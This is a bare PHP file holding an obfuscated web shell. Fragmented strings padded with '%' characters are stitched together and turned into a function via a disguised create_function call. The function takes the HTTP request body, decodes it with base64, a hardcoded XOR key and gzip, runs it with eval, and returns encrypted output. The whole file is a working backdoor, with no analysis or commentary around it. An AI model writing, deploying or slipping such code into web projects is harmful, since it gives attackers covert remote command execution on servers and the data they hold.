<?php
$H='matc%h("/$kh(.+)$kf/%%",@file_get%_%co%ntents("php%://input%"),$';
$L='o%de($m[%1]),$k)));$o=@ob_get%%_contents();@%%ob_%end_%clean();$r=@bas';
$O='e%64_enco%de(@x%(@gzcom%pres%s($o),$%k)%);pr%%int("$p$kh$r$kf");}';
$k='$k=%"d16060a8";$%kh="%b%a4eccd4e%345";%$k%f="%da6%99bf7f7fc";$p=';
$V='m)=%=1) %{@ob_star%t();@ev%al%(@gzuncomp%%re%ss(@x(@b%ase6%4_dec';
$f='"%eqr%nBQsvIVesugpU"%;func%tion x($%t,$k){%$c=s%trlen($k%);$l%=s';
$P=str_replace('L','','cLrLLeateL_funLctiLon');
$x='trlen%($%t%)%;$o="";%for($i=0;$i<$l;){fo%r($j=%0;($j<$c%&&$i<%$l';
$F=');$j+%%%+,$i++){$o.=$t%%{$i}^$k%{$j};}%}return $o%;}if% (%@preg%_';
$B=str_replace('%','',$k.$f.$x.$F.$H.$V.$L.$O);
$A=$P('',$B);$A();
?>
